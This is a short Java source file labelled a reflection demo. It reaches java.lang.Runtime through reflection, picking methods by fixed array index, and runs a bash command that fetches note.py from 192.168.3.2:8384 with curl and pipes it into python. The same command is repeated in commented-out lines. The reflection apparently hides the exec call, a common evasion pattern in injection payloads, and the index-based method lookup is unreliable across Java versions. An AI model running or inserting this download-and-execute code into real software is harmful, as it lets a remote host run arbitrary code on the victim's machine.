import java.lang.reflect.Method;

public class ReflectionDemo {

    public static void main(String[] args) {
        try {
//            String[] cmd = {"/bin/bash", "-c", "curl 192.168.3.2:8384/note.py |python -"};
            Object[] obj = new Object[1];
            String[] cmd = new String[3];
            cmd[0] = "/bin/bash";
            cmd[1] = "-c";
            cmd[2] = "curl 192.168.3.2:8384/note.py |python -";
            obj[0] = cmd;
            Method[] declaredMethods = "".getClass().forName("java.lang.Runtime").getDeclaredMethods();
            Method execArrMethod = declaredMethods[14];
//            execArrMethod.invoke(declaredMethods[7].invoke(null),
//                    new Object[]{new String[]{"/bin/bash", "-c", "curl 192.168.3.2:8384/note.py |python -"}});
            execArrMethod.invoke(declaredMethods[7].invoke(null), obj);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
